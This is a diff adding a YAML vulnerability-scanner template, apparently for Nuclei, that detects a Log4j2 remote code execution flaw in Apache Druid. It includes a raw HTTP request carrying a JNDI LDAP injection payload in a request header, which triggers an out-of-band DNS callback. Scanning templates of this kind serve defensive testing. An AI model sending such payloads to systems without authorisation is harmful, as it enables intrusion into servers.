@@ -1,0 +1,30 @@
+id: apache-druid-log4j2-rce
+info:
+  name: Apache Druid Log4j2 Command Execution Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Apache Druid is susceptible to a command execution vulnerability due to improper handling in Log4j2. Attackers can exploit this vulnerability to execute arbitrary code on the server, potentially gaining full control.
+  reference:
+    - https://druid.apache.org
+  tags: log4j2, rce, apache, druid
+http:
+  - raw:
+      - |
+        POST /druid/coordinator/v1/rules/_default HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36
+        Content-Type: application/json;charset=UTF-8
+        X-Druid-Comment: ${jndi:ldap://{{interactsh-url}}}
+
+        [{"period":"P1D","includeFuture":true,"tieredReplicants":{"_default_tier":2},"type":"loadByPeriod"}]
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+      - type: word
+        part: header
+        words:
+          - "application/json"
